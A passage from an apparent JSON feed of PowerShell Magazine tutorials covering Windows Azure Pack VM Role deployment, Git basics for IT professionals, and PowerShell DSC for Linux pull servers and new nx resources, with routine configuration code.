and extract the files to your module directory of choice.\nWhy not base it on Azure PowerShell module? The reason why I base the DSC resource on my own PowerShell module is because I wanted to enable the scenario of authentication with bearer (JWT) tokens instead of certificates or publish settings files. Bearer tokens are used by the Windows Azure Pack portals and are generated by either the Windows Azure Pack Authentication website or ADFS. By default, the tenant public API (the API exposed to the internet/public) does not accept bearer tokens, only certificates. This behavior can however be modified. The tenant API does accept bearer tokens by default. Bearer tokens are more easy to work with (especially in the Enterprise scenario) then certificates/publish settings files as they are acquired on the spot. No need to make sure the certificates are in the store, etc.\nAnother reason is that the Azure PowerShell module, although suitable to work with Windows Azure Pack, does not have a way to interrogate the view and resource definition of a VM Role Gallery Item. The lack of this functionality makes it difficult for the tenant user to generate the correct JSON needed by the New-WAPackVMRole cmdlet.\nLet’s have a look on how things would be done via the tenant portal first and then look at using the Azure module so we have a good grasp of what we are trying to do.\nThe Tenant Portal Experience After you logon either through the Authentication Site or via ADFS, you deploy a VM Role via the NEW menu on the bottom of the Tenant Portal and select “Virtual Machine Role” -\u0026gt; “From Gallery”.\nYou will be presented with a gallery list of VM Roles that have been made available to the subscriptions you are a member of. You select one and press the next button.\nWhen clicking through the UI View Definition of the VM Role, the JSON needed to deploy the VM Role is constructed by the web application. Once the “wizard” is finished and you click deploy, a cloud service is created with the same name as the one you gave to the VM Role (Azure Pack Tenant Portal has a 1:1 relation between a cloud service and a cloud resource, aka VM Role). Then the VM Role is deployed to it. But who wants to click right?\nThe Azure Module Experience As I’ve already stated, to use the Azure PowerShell module with Windows Azure Pack you first need to get your publish settings file. First go to the Windows Azure Pack tenant portal address but append “/publishsettings” to the URL.\nAfter login, you will be presented with this site:\nThe publish settings file will be automatically downloaded (if it is not, hit the here link).\nLet’s take a look at the content of this file so we know what we are actually working with.\nAs you can see, the file is actually an XML file. The XML holds the subscription data I have access to including Azure Pack generated management certificates.\nWhen looking at the certificate data, you see that it holds both a public and a private key and it’s valid for one year (the certificate is generated on the spot when you download the publish settings file).\nWhen looking in the tenant portal you can see the certificates have been added there as well.\nYou can see that for every subscription you have access to, a certificate will be generated so you need to download a new publish settings file every time you enroll into a new subscription.\nNow we have the file, we can start using the Azure module (make sure you have installed the Azure module first).\nFirst we import the publish settings file to import the certificates into the User Cert store and make the subscriptions data available to us. Then we select the subscription we want to work with (in my case, I have 2 subscriptions and I want to work with “test”). If you like, you could use the commands aliases: Import-WAPackPublishSettingsFile, Get-WAPackSubscription, etc.\nNow everything is into place to start deploying a VM Role. Let’s look what native WAPack cmdlets we have available to figure out how to do this.\nThe cmdlet we are after is New-WAPackVMRole. If we look at the help example you know this is going to be difficult. The help does not specify how to create the content of the $resdef variable for good reason. The Azure module has nothing native to generate the correct JSON data.\nLuckily we can generate the JSON data ourselves. We interrogate the API for the gallery items. A gallery item provides us with the links to acquire the needed data from the resource definition and view definition (you can learn all about the inner workings of VM Roles by going to Marc van Eijk’s excellent blog posts here). From this definition data we construct the JSON needed for the $resdef variable.\nSince we need to create a bunch of new functions, plus the dependency on the Azure module and the publish settings file, you start to notice this is not really a friendly approach.\nIn the next article, we’ll look at working with my PowerShell module which would give us everything we need in one place.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/28/journey-to-a-windows-azure-pack-vm-role-dsc-resource/","tags":["Azure Pack","PowerShell DSC"],"title":"Journey to a Windows Azure Pack VM Role DSC Resource: Introduction"},{"categories":["DevOps","Git"],"contents":"In this series so far,\nPart 1 - Git for IT Professionals: Getting Started\nPart 2 – Git for IT Professionals: Working with Repositories\nPart 3 – Git for IT Professionals: Life Cycle of Repository Files (this article)\nIn the previous part, we walked-through creating our first repository and adding files to it and finally committing the files to the repository. This was a simple and basic workflow to get started with Git. In the process, I had mentioned about tracked and untracked files and staged and unstaged files and so on. For a beginner, it is important to understand the life cycle of version-controlled files in a Git repository. This is what we will discuss in this part of the series. Similar to the other part of the series, we will use an example walk-thorough to understand the concepts. I recommend trying out the commands as you read the article.\nFor this article, we will start by creating a new repository with no files in it.\ngit init FirstRepo This initializes an empty Git repository under the home directory of the logged in user. Running git status inside the repository reveals that there are no files that are tracked.\nLet us add a few files here. PowerShell scripts, of course. I chose to copy a few readymade scripts I have into this repository directory directly.\nRunning git status now shows that I have some files that are in the repository directory or the working tree but are untracked.\nSo, that first state of files in a newly created Git repository is Untracked. Git is helpful enough and tells us what needs to be done to start tracking these files. We have to run git add.\nTip: You can use git add . if you intend to add all files in the working tree to the index for next commit. I have highlighted part of the earlier sentence to ensure you understand the importance of this command. If you don’t intend to add all files in the working tree to next commit, specify them explicitly.\nIn my example, I am going to add all the files in the repository folder to the next commit.\nAs you see in this output the files moved from Untracked to Staged! Now, if we use the git commit command, all these files will get added to the master branch and get tracked.\nLet us now modify one of the scripts and see what happens. In my example, I modified the wim.ps1 script to add a comment at the beginning of the file.\nAs expected, we see the file that we modified as modified! Hurray! This happens because the file is already present in the Git tracked files and the index. In technical terms, the last commit includes this file. So, Git finds that the file content is different from what is there in the last commit and tells us the same. If you read the message closely, it also tells us that we can either use git add to stage this file for next commit or git commit to commit the changes directly. For now, let us stage the changes for next commit.\nInstead of doing a commit now, let us modify this file (wim.ps1) again and check git status.\nUnexpected? Not really. I said Git is different from other VCS. Git does not track changes to files per se. If we go revisit Git basics, we discussed that every time we run git add, Git actually takes a point-in-time snapshot of the file and tracks that for the next commit. So, when we modified the file again after git add, Git finds that the content of the file on disk is different from what is being tracked for next commit. This is the reason why we see the same file in the staged section as well as unstaged section of git status. If we use git commit now, the version of the file which is in the snapshot becomes tracked.\nCaution: Git tells us that we can use git checkout to discard changes. Be very careful when you do this. This command takes the last staged/commit version from the repository and overwrites that on the disk. This may have unintended consequences or result in loss of data.\nSo, instead of discarding changes on the disk, if you want to update the staged version of the file, we can use git add –u or simply git add. The git add –u commands ensure that it updates only the modified files in staged snapshot and does not add any new files in the working tree that are not tracked yet.\nWhile you were busy reading through and practicing what you just learned, I went ahead and made a few random changes to already tracked files, added a few more files and modified a few staged files. Here is how my git status looks like now.\nThis may be confusing when more than one file is listed in different states. Git provides a short status too that can be very helpful understanding in an easy manner than a more verbose output.\nYou will see that there are two columns in the output shown by git status –s. The left column indicates that the files are staged and the right-hand column indicates the files that are modified.\n The ?? at the end indicates that the file is not tracked. The status A shown next to wim4.ps1 and wim5.ps1 indicates that these files are new and staged for next commit. The status M next to newly added wim5.ps1 indicates that the file was modified after it was staged. The status M next to Support-Scripts.ps1 indicates that the file is modified and the same has been staged for commit. The status M next to wim2.ps1 indicates that the file was modified but the contents are not staged for next commit yet. The status MM next to wim.ps1 indicates that the already tracked file was modified and staged for next commit but was modified again.  Just remember that the left column indicates files that are staged for next commit and the right column indicates files that are modified. As you start using Git more and more, looking at this short status and making sense of what’s going on in the repository becomes very easy. Finally, what if we want to stop tracking a file in the repository? Or in other words, how do we mark a file untracked and remove it from the commit snapshot? The git rm command is the answer. Note that using git rm, removes the file from disk too. If you don’t intend to remove the file from disk, use the –Cached switch with the git rm command. However, doing so will show the removed file as untracked in the git status output.\nOverall, we have seen files moving from one state to another as we made changes or added new files to repository. In a nutshell, we had untracked file which moved to staged and then tracked state after a git commit. We now have the same file in staged as well as unstaged state. We finally, removed files from the repository and made them untracked again. And, that is the complete life cycle of files in a Git repository. A picture is worth a thousand words. Let us conclude today’s article by looking at this diagram that shows different states of files in a Git repository and what actions bring files to those states.\nThis is it for today! Your feedback is more than welcome and will help me improve the overall series. Stay tuned for more!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/27/git-for-it-professionals-life-cycle-of-repository-files-2/","tags":["DevOps","Git"],"title":"Git for IT Professionals: Life Cycle of Repository Files"},{"categories":["DevOps","Git"],"contents":"In this series so far:\nPart 1 – Git for IT Professionals: Getting Started\nPart 2 – Git for IT Professionals: Working with Repositories (this article)\nPart 3 – Git for IT Professionals: Life cycle of repository files\nIn the previous article, I touched upon creating a Git repository but did not quite explain what those commands meant and what different ways of creating a repository are. In this part of the article, we will explore different ways of creating repositories and working with them.\nBefore we get started, let’s understand what a Git repository is. A Git repository is where your project lives. It is just another folder with .git subfolder inside it that contains all the version controlled objects. The git init command is what creates this .git subfolder and the required objects inside that. There are multiple ways of creating a new repository.\nThe first method is to simply run the git init  command at the GitBash console. This command create a directory with the specified project name and initializes the .git subfolder inside the project directory. By default, GitBash console starts in the user’s home directory. So, folders created by git init command will be inside the user’s home directory.\nAs you see in the above picture, running git init MyFirstRepo command creates a directory with the same name as the project and initializes the .git subfolder within that. This subfolder contains all the required files and folders to start tracking version control information for the project.\nIn the second method of creating a repository, we can go to an existing folder (even when it contains files) and initialize that directory as a repository.\nIn the above example, you will see that I have an existing folder with a PowerShell script. Within that folder, I had initialized the repository and a .git subfolder gets created with similar contents as our first example. We will discuss the need and use of these special files and folders within the .git subfolder as we progress in this series.\nThere is a third method to create a Git repository and that is called cloning. We will discuss that at a later point in time. To see the status of the projects we just created, we can run git status command. This needs to be run in the project directory.\nThe output shown above has two important things we need to know. First is the branching concepts and how to use it effectively. For now, understand that like every other VCS, Git supports branching and that master branch is the main branch in the repository. The second thing we need to know is the commit concepts. The above command output shows that there is nothing to commit (for MyFirstRepo) and we can use git add command to create or copy files to track. For the second repository (MySecondRepo) which was initialized in an existing directory, we see that there are untracked files and output suggesting that we use git add  to start tracking those files.\nUnlike other VCS, Git does not track or commit any files into the repository unless they are explicitly added using the git add command. This eliminates accidental commits that developers generally face with other VCS. Let’s run git add TestScript.ps1 inside the MySecondRepo repository and see what happens.\nAs shown in the above output, running git add command inside the repository adds the file specified to tracking and stages it for any future commits. Internally, Git takes a snapshot of the tracked files in the working tree and stores that in the Git index. The below output from the project’s .git directory shows that the tracked files are now added index (file named index).\nWe can now commit this file by using the git commit command.\nWhen we use git commit command, we are expected to specify the commit message. If that was not provided as a part of the command line arguments, the default VIM editor gets opened for prompting the message.\nNote: If you are not a big fan of VIM and instead want to use PowerShell ISE as the editor for these messages, you can change it in the Git configuration settings using git config core.editor powershell_ise.exe command.\nIf you want to avoid this prompt, you can specify the –m switch. For example,\ngit commit -m \u0026#39;This is my first commit\u0026#39; Once the commit is complete, you will see output similar to the below.\nIf you have followed the steps so far and completed a git commit, congratulations! You just followed the end to end flow for creating your first version controlled repository.\nSince Git takes a snapshot of the working tree, any changes made after the git add command won’t be staged for commit. So, if we modify a file that is tracked and committed, running git status command will tell us that there are changes to tracked or committed files that are not staged yet.\nAt this point, if you want to commit the updates to a tracked file or start tracking new files, you know what exactly you need to do. Yes, you need to use the git add command. Running git add command again will take a snapshot of all the tracked and/or modified files to the index and stages it for next commit.\nIf you all you want to do is update already tracked files, we can use git add command with –update switch. This will modify the index for already tracked and modified files but does not add any new files that are not tracked.\nWhat we have learned so far is the basics of working with repositories. There is certainly more. However, let’s stop here for now and practice what we learned so far.\nI have mentioned different states of a Git controlled file. For example, Git file goes from untracked to tracked state and unstaged to staged state and finally, it goes to a committed state. The git status command provides this information. However, it is important to understand the life cycle of a Git repository to make better use of VCS. And, that is our next article. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/15/git-for-it-professionals-working-with-repositories/","tags":["DevOps","Git"],"title":"Git for IT Professionals: Working with Repositories"},{"categories":["DevOps","Git"],"contents":"In this series so far:\nPart 1 – Git for IT Professionals: Getting Started (this article)\nPart 2 – Git for IT Professionals: Working with Repositories\nPart 3 – Git for IT Professionals: Life cycle of repository files\nBy now, you must have seen the announcement of moving DSC resource kit modules to GitHub and opening it for community contributions. So, if you are keen on contributing to this repository, the first thing you must know is, obviously, how to use GitHub. In this series of articles, I will introduce Git — a version control system that GitHub hosts — and help you learn different version control concepts. We will use Git CLI locally for all our examples but eventually show how you can create and work with remote repositories on GitHub. And, we will also see how to use build automation and continuous integration support with AppVeyor. So, by the end of this series, you will have a solid understanding of the Git concepts, GitHub usage, and how to perform build automation and continuous integration.\nWhat is version control? For an average IT professional, I was one a few years ago, version control is an alien concept. We never needed it and it was only a developer thing until recently. The recent focus on DevOps and infrastructure as code practices made version control a mandatory skill for IT professionals too. Infrastructure as code practice says that configuration of systems should be considered as code and that code must be version controlled, unit tested, and then deployed to relevant environment after continuous testing. Having version controlled configurations makes it easy to roll back to an earlier configuration, if and when needed. In essence, a version control system keeps track of changes to a file or set of files. And, these files don’t have to be script files. Version control can be applied to almost every type of file.\nThere are many different types of version control systems out there. Git is one of them. But, what makes Git so special and most popular?\nThe earlier version control systems (CVCS) were centralized. This includes VCS such as Subversion. CVCS means that there is a central server hosting the version control database which keeps the entire history of changes to files. Clients or developers check-out files from this central repository, make changes and check them in. The obvious issue here is the availability of the central server hosting version control database. If this server is down or the data hosted on this server gets corrupted, you are doomed!\nThe Distributed Version Control Systems (DVCS) solve the problem with CVCS. Git is one of them. When using DVCS, we don’t check-out files that we need. Instead, we clone an entire repository. Each repository in the distributed system keeps a local copy of all changes made and the history about all previous versions. This also makes it possible for developers to collaborate effectively. So, in case of corruption of a repository, it is much easier to re-create the same by using one of the client’s local cloned repository.\nIn this series of articles, we will focus our time and energy on Git. So, let’s jump into that right away.\nHistory of Git Now coming back to Git, it was started after a fight between the Linux Kernel community and the company that was providing version control services (BitKeeper) to them. Linus Torvalds, in 2005, started the development of their own distributed version control system and called it Git. Git was started with a goal to create a version control system that is very fast, simple to use, fully distributed, and, finally, handle small to large projects in the same way without any restrictions. Git, indeed, has met all those goals. Just imagine the scale of Linux kernel patch submissions that happen every day. Git scales really well and it is no wonder why it is the most popular version control system out there.\nHow does Git work? Unlike the other version control systems that track and store a list of changes between different versions of files in the database, Git uses snapshots. A snapshot is a point in time copy of the data. Every time we save state of the repository or commit changes, Git generates a snapshot of the repository at that point in time and stores references to that snapshot in the version control database. We will see the benefits of this approach in a later part but for now understand that this is one of the core aspects of Git that places it well ahead of others in the DVCS space.\nGetting started with Git Before we get started, understand that Git is the underlying version control system for many providers such as GitHub. Understand that GitHub is a Git hosting service and not version control system itself. The GitHub client for Windows provides an easy to use GUI to work with version controlled repositories hosted locally or on GitHub. There are many other GUI clients that provide the capability similar to GitHub for Windows and help connect to a central Git server in your own organization. In this series of articles, at least in the first few parts, we will use only the Git command line interfaces (CLI) to work with Git repositories locally or remotely. This helps us understand the concepts well and makes it easy to transition to GUI when needed. Also, understand that the GUI clients provide only a subset of functionality available at the command line.\nYou can get Git command line when you install GitHub for Windows. However, we will use the Git download from git-scm.com. This is always ahead from the Git version that comes with any of the GUI clients.\nOnce you have downloaded the Git client setup file, you can install it silently using the command line parameters.\n$GitPath = \u0026#39;C:\\temp\\Git-1.9.5-preview20150319.exe\u0026#39; Start-Process -FilePath $GitPath -ArgumentList \u0026#39;/SILENT /LOG=\u0026#34;C:\\Temp\\GitClient.log\u0026#34;\u0026#39; After the install, on my Windows 8.1 system, I see three entries when I search for Git.\nGit GUI is a minimal GUI client that provides a way to create new repository or open an existing repository or clone a repository. We won’t use this at all. Git Bash is the command console that we will use the most in this series of articles. This is where we will run all the Git commands to create and manage repositories. .gitconfig is related to the discussion that we will have now.\nConfiguring Git environment One of the first things that we must do before we do anything with Git client is to tell Git our identity. This is done using the git config command. Run the following commands at the Git Bash console.\ngit config --global user.name \u0026#39;Your Name\u0026#39; git config --global user.email \u0026#39;Your Email\u0026#39; This identity information gets used when you create repositories. Now, observe the command line. We have used the –global flag. This flag indicates that we want to update the .gitconfig file in the home directory of the current user. What if we want to apply this information to all users on this system? We need to use the –system flag instead of –global. And, what if we want to customize this identity information for a specific repository on the system? When you are inside the repository directory, run git config with no –global or –system flags. Think of these gitconfig files as the PowerShell profiles. There are available at various levels. So, which one takes precedence?\nThe inner-most layer in the above picture takes precedence over the outer layers. The Git config files are used to configure settings that impact the way you work with repositories. Therefore, it is important to understand this order of precedence. We can test this very easily! Run the following commands at the Git Bash console.\n#Set system-wide identity git config --system user.name \u0026#39;Test User 1\u0026#39; git config --system user.email \u0026#39;TestUser1@TestGit.com\u0026#39; #Set current user identity git config --global user.name \u0026#39;Test User 2\u0026#39; git config --global user.email \u0026#39;TestUser2@TestGit.com\u0026#39; #Create a repository git init testrespository cd testrespository/ #Set local user identity git config --local user.name \u0026#39;Test User 3\u0026#39; git config --local user.email \u0026#39;TestUser3@TestGit.com\u0026#39; We can see all the settings in the order of precedence by using git config –list command.\nYou can see in the above picture that the settings configure inside the Git repository appear at the end and therefore take precedence over the other levels of configuration. The git config command has several other options which we will learn throughout this entire series.\nThis is it for today! We will learn how to create and do some basic work with the Git repositories locally in the second part of this series. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/13/git-for-it-professionals-getting-started-2/","tags":["DevOps","Git"],"title":"Git for IT Professionals: Getting Started"},{"categories":["PowerShell DSC","Linux"],"contents":"Initial release of PowerShell DSC for Linux had one big gap: it supported only pushing the configuration to the node. And even though this mode is good enough for demos or basic proof of concept, it doesn’t seem like a proper solution for production environment. The first official version of PowerShell DSC for Linux supports both modes of configuration delivery–Push and Pull. In this part of the series, we will take a look at setting up Linux to pull configuration from single and multiple pull servers.\nWhen we author DSC configuration for Linux, we can use both WMF4 and WMF5. Same applies to meta-configurations used to set up Local Configuration Manager (LCM) settings. In both versions we have to set LCM RefreshMode to Pull and define/list download managers. First, we will take a look at configuration for LCM defined using WMF4 syntax:\nConfiguration LinuxPull { param ( [String]$ComputerName, [guid]$Id ) node $ComputerName { LocalConfigurationManager { RefreshMode = \u0026#39;Pull\u0026#39; ConfigurationID = $id.Guid ConfigurationMode = \u0026#39;ApplyAndAutocorrect\u0026#39; DownloadManagerName = \u0026#39;WebDownloadManager\u0026#39; DownloadManagerCustomData = @{ ServerUrl = \u0026#39;https://pull.monad.net:8080/PSDSCPullServer/PSDSCPullServer.svc\u0026#39; } RebootNodeIfNeeded = $true } } } Configuration using WMF5 (based on April 2015 preview) is slightly different mainly because of separation of global settings and configuration for download managers and attribute that we need to apply to the configuration in order to distinguish it from “normal” configuration:\n[DSCLocalConfigurationManager()] configuration LinuxPullv5 { param ( [String]$ComputerName, [guid]$Id ) node $ComputerName { Settings { RefreshMode = \u0026#39;Pull\u0026#39; ConfigurationID = $id.Guid ConfigurationMode = \u0026#39;ApplyAndAutocorrect\u0026#39; } ConfigurationRepositoryWeb main { ServerURL = \u0026#39;https://pull.monad.net:8080/PSDSCPullServer.svc\u0026#39; } } } As a next step, we have to generate MOF document for our node and save it to the correct location together with matching checksum file. For testing purposes we will use hello world configuration to avoid any kind of issues with configuration itself:\nConfiguration TestPull { param ( [String]$ComputerName ) Import-DscResource -ModuleName nx node $ComputerName { nxFile Test { DestinationPath = \u0026#39;/tmp/pull\u0026#39; Contents = \u0026#34;Hello World!`n\u0026#34; } } } TestPull -ComputerName $id.Guid -OutputPath $mainConfig New-DscChecksum -Path $mainConfig -Force LinuxPullv5 -ComputerName PSMag.monad.net -Id $id Set-DscLocalConfigurationManager -Path .\\LinuxPullv5 -CimSession $linuxCim -Verbose Update-DscConfiguration -CimSession $linuxCim -Wait cURL failed to perform on this base url: pull.monad.net with this error message: Peer certificate cannot be authenticated with given CA certificates. The result we get should not be too surprising for anybody who worked with Pull servers. We told our Linux node to talk to Pull server using HTTPS. The problem is that we didn’t do anything to make sure that Linux trusts the certificate on our Pull server. If nodes are only Windows and domain-joined that can be handled easily with group policies. Release notes for PowerShell DSC for Linux suggest to walk around this problem by forcing cURL to trust our certificate. What I would recommend instead is to configure Linux to trust our Enterprise CA (I’m making assumption that you already use it for certificates on Pull servers). It gives us extra advantage that if we ever decide to change the Pull server, or use more than one, we don’t have to repeat all the steps necessary to convince cURL to trust it. I suspect procedure may differ between distributions; the one I followed is for CentOS (assuming monad-ca-ca.cer is locally saved certificate file for our enterprise CA):\n$certFile = @{ LocalFile = \u0026#39;.\\monad-ca-ca.cer\u0026#39; RemotePath = \u0026#39;/etc/pki/ca-trust/source/anchors/\u0026#39; Credential = $root ComputerName = \u0026#39;PSMag.monad.net\u0026#39; } Set-SCPFile @certFile $ssh = New-SSHSession -ComputerName PSMag.monad.net -Credential $root $PSDefaultParameterValues.\u0026#39;Invoke-SSHCommand:SSHSession\u0026#39; = $ssh Invoke-SSHCommand -Command \u0026#39;update-ca-trust enable\u0026#39; Invoke-SSHCommand -Command \u0026#39;update-ca-trust extract\u0026#39; Invoke-SSHCommand -Command \u0026#39;/opt/omi/bin/ConsistencyInvoker\u0026#39; Invoke-SSHCommand -Command \u0026#39;cat /tmp/pull\u0026#39; Note: I have used Posh-SSH module to copy files/invoke commands, you can read more about it here.\nIf our certificate was added to ca-trust we should be able to see content of our hello world file. If that didn’t help reading logs and observing behavior of omiserver run interactively may give us clues why it still fails.\nI’ve mentioned using more than one Pull server few times already. There is very good reason for that: PowerShell DSC for Linux not only supports Pull server, it also supports partial configurations. You can read more about partial configurations in one of the previous articles written by Ravi. Long story short: partial configurations enable scenarios where separation of roles and taking pieces of configuration from different Pull servers (potentially owned by different teams) is necessary. The way partial configuration work evolves: when I tried to apply patterns from Ravi’s post with current version it failed. The procedure I had to follow:\n create configuration that contains two Pull servers and two partial configurations  [DSCLocalConfigurationManager()] configuration PartialConfiguration { param ( [String]$ComputerName, [guid]$Id ) node $ComputerName { Settings { RefreshMode = \u0026#39;Pull\u0026#39; ConfigurationID = $id.Guid ConfigurationMode = \u0026#39;ApplyAndAutocorrect\u0026#39; } ConfigurationRepositoryWeb pull { ServerURL = \u0026#39;https://pull.monad.net:8080/PSDSCPullServer.svc\u0026#39; } ConfigurationRepositoryWeb partial { ServerURL = \u0026#39;https://partial.monad.net:8080/PSDSCPullServer.svc\u0026#39; } PartialConfiguration base { ConfigurationSource = \u0026#39;[ConfigurationRepositoryWeb]pull\u0026#39; } PartialConfiguration details { ConfigurationSource = \u0026#39;[ConfigurationRepositoryWeb]partial\u0026#39; DependsOn = \u0026#39;[PartialConfiguration]base\u0026#39; } } }  create two configurations with the names matching LCM partial configurations and drop generated MOFs to Pull servers (I didn’t change file’s’ names) generate checksums for both files  Configuration base { param ( [String]$ComputerName ) Import-DscResource -ModuleName nx node $ComputerName { nxFile test { DestinationPath = \u0026#39;/tmp/pull\u0026#39; Contents = \u0026#34;I\u0026#39;m from Pull server!`n\u0026#34; } } } base -ComputerName $id.Guid -OutputPath $mainConfig New-DscChecksum -Path $mainConfig -Force Configuration details { param ( [String]$ComputerName ) Import-DscResource -ModuleName nx node $ComputerName { nxFile test2 { DestinationPath = \u0026#39;/tmp/partial\u0026#39; Contents = \u0026#34;I\u0026#39;m just partial!`n\u0026#34; } } } details -ComputerName $id.Guid -OutputPath $partialConfig New-DscChecksum -Path $partialConfig -Force  configure LCM with previously created meta MOF document  I was using April preview of WMF5, so before doing last step I had to modify generated MOF. My client was saving partial configurations as an array, LCM was expecting singleton. Here is simple function I’ve used to clean up MOF and code I’ve used to generate, update and implement it:\nfunction Update-MetaDocument { param ( [Parameter( ValueFromPipeline, Mandatory )] [ValidateScript({ Test-Path -Path $_ })] [String]$Path ) process { $body = Get-Content @PSBoundParameters -Raw $body -replace \u0026#39;(?s)(ConfigurationSource = )\\{([^}]*)};\u0026#39;, \u0026#39;$1 $2;\u0026#39; | Set-Content @PSBoundParameters -Force } } PartialConfiguration -ComputerName PSMag.monad.net -Id $Id | Update-MetaDocument Set-DscLocalConfigurationManager -CimSession $linuxCim -Path .\\PartialConfiguration Note: if you are using February preview of WMF5 cleaning up MOF document shouldn’t be necessary. Schema for meta-configuration of LCM changed between these two versions and PowerShell DSC for Linux was is currently based on earlier version.\nAfter completing these steps and updating configuration on the Linux node I could see both files on the disk with expected content:\n[root@PSMag ~]# ConsistencyInvoker [root@PSMag ~]# cat /tmp/pull I\u0026#39;m from Pull server! [root@PSMag ~]# cat /tmp/partial I\u0026#39;m just partial! As you can see PowerShell DSC for Linux matured a lot since its initial release. I must also say that team is more responsive at the moment. I reported an issue with the current version (related to Polish characters in the MOF document and using UTF8-encoded MOF) and I was able to apply a patch that fixes this problem few days later. You can find this patch in a separate branch on GitHub repo for PowerShell DSC for Linux. For me that change is as important as all the features added in the current release: being able to report problems and receive fixes for them between releases is very important for any early adopter. I would love to be able to contribute to the project and there is opportunity for that too: for now it’s just resources written in native code (you can read about it in Linux DSC announcement on PowerShell team blog), but I hope it will extend to Python-based resources and the core product soon. Keeping all that in mind I’m more confident than before that PowerShell DSC for Linux is something we should start to consider as a solution for managing Linux systems.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/10/powershell-dsc-for-linux-pull-server/","tags":["PowerShell DSC","Linux"],"title":"PowerShell DSC for Linux: Pull Server"},{"categories":["PowerShell DSC","Linux"],"contents":"New version of PowerShell DSC for Linux doubled the number of resources available. Initial batch in CTP covered basics: nxUser to create and manage users, nxGroup to define groups and manage group members, nxFile to create and modify files, nxService to start, stop, enable, and disable daemons, and nxScript to cover anything that couldn’t be done with other resources. We covered these resources in the previous series and they haven’t changed much since.\nNew resources cover installation of packages (nxPackage), injecting single line into existing file (nxFileLine), configuring environment variables (nxEnvironment), working with archived data (nxArchive) and setting up authorized SSH keys (nxSShAuthorizedKeys). In this part of the series we will focus on these newly-added resources.\nnxPackage We will start with nxPackage. For me personally that is the most important resource from those added in this release. I created composite resource for previous version to cover this gap. Unlike my composite resource, the one that shipped covers several package managers. It has support for local installation of packages. You just have to specify FilePath to package file. It understands concepts of package groups. You can specify Arguments for installation and define what is expected ReturnCode. I’m a CentOS user. So, I’ve tested it with yum. It worked fine for any scenarios that I’ve tried. For very basic scenarios when you specify absolute minimum information, the only required property is the Name:\nConfiguration packages { Import-DscResource -ModuleName nx node LinuxNode { nxPackage apache { Name = \u0026#39;httpd\u0026#39; } } } If you don’t specify package manager the resource will try to find one for you. That means that if you are not sure or have a mixed environment with distributions that resemble both Debian and RedHat, you can use one configuration and it will “just work”. The part of code that does the magic is using which command:\ndef GetPackageManager(): ret = None # choose default - almost surely one will match. for b in (\u0026#39;apt-get\u0026#39;, \u0026#39;zypper\u0026#39;, \u0026#39;yum\u0026#39;): code, out = RunGetOutput(\u0026#39;which \u0026#39; + b, False, False) if code is 0: ret = b if ret == \u0026#39;apt-get\u0026#39;: ret = \u0026#39;apt\u0026#39; break return ret In my opinion that is very elegant solution to the problem of package management diversity between Linux distributions.\nIf we don’t want to depend on the resource to find package manager for us or we want to be sure that specific manager is used, we need to specify it in our configuration. If given manager is not present on remote system, we should get an error but that is unfortunately not very verbose. To find actual cause, we would have to use my favorite (and from my experience–the most effective) debugging technique, run omiserver interactively:\nCalledProcessError. Error Code is 127 CalledProcessError. Command string was dpkg-query -W -f=\u0026#39;${Description}|${Maintainer}|\u0026#39;Unknown\u0026#39;|${Installed-Size}|${Version}|${Status} \u0026#39; httpd CalledProcessError. Command result was /bin/sh: dpkg-query: command not found check installed:/bin/sh: dpkg-query: command not found CalledProcessError. Error Code is 127 CalledProcessError. Command string was apt-get install --allow-unauthenticated --yes httpd CalledProcessError. Command result was /bin/sh: apt-get: command not found Failed to Install httpd output for command was: /bin/sh: apt-get: command not found My system doesn’t have apt-get on it, so error message is expected.\nIf we want to remove packages, we can do it by specifying value Absent to Ensure property.\nnxFileLine Another interesting and potentially useful resource is nxFileLine. Unlike nxFile, this one is suitable for any component that have just one configuration file without option to read parts of the configuration from other files stored on disk. In such a case, replacing whole file may not be the best option. What we need is an option to remove certain lines or add lines that we need. Former can be achieved with a DoesNotContainPattern property which accepts regular expressions. Latter is done with ContainsLine property that specifies the line that needs to be appended. You have to be aware that there is no correlation between the two: new line is always added at the end of a file, so if position in the file is important; nxFileLine won’t help you. Example configuration that makes sure that sshd is not trying to resolve hosts (handy in lab environment) and removes any line that is just a comment:\nConfiguration Lines { Import-DscResource -ModuleName nx node LinuxNode { nxFileLine sshd { FilePath = \u0026#39;/etc/ssh/sshd_config\u0026#39; DoesNotContainPattern = \u0026#39;^#.*?$|UseDNS yes\u0026#39; ContainsLine = \u0026#39;UseDNS no\u0026#39; } } } nxEnvironment Another common need on Linux system is configuration of environment variables. Their purpose and behavior is similar to the one we observe on Windows: most of variables are product-specific and are used only by certain applications. There is one environment variable that stands out: PATH. The only difference between both systems is separator: Windows is using semicolon where Linux is using colon. One of the resources added in this release (nxEnvironment) is designed to configure these variables, including the PATH. Example configuration adds OMI_HOME variable and adds folder with OMI binaries to the PATH:\nConfiguration Environment { Import-DscResource -ModuleName nx node LinuxNode { nxEnvironment Normal { Name = \u0026#39;OMI_HOME\u0026#39; Value = \u0026#39;/opt/omi\u0026#39; } nxEnvironment Path { Name = \u0026#39;WhoCares?\u0026#39; Path = $true Value = \u0026#39;/opt/omi/bin\u0026#39; } } } This configuration highlights two differences between “normal” variables and the PATH variable. Former use name to specify the name of variable, for PATH it’s still a key value, but used only to differentiate between several items added to the path. To tell the resource that it’s a path that we configure we need to provide value $true to Path parameter. Another difference is a way both types are defined on Linux box. PATH is configured in /etc/profile.d/DSCEnvironment.sh by appending each item to existing PATH with colon as a separator. Any other variable definition is added to /etc/environment that is dot-sourced in DSCEnvironment.sh. The only problem I’ve found so far with this resource is related to Ensure property. Specifying Present works fine, but Absent don’t seem to change anything if variable is defined in another script under /etc/profile.d.\nnxArchive Another resource, nxArchive, should help us with using archived files. All you need to do is specify path to archive and destination for the files. This resource have very similar properties as Archive available for Windows. The difference is checksum usage: we can choose between md5, mtime, and ctime. Another difference is lack of credential support and validate property. Example configuration would use archive /tmp/source.tgz and create /tmp/target folder using it content:\nConfiguration Archive { Import-DscResource -ModuleName nx node 192.168.7.204 { nxArchive tmp { SourcePath = \u0026#39;/tmp/source.tgz\u0026#39; DestinationPath = \u0026#39;/tmp/target\u0026#39; Checksum = 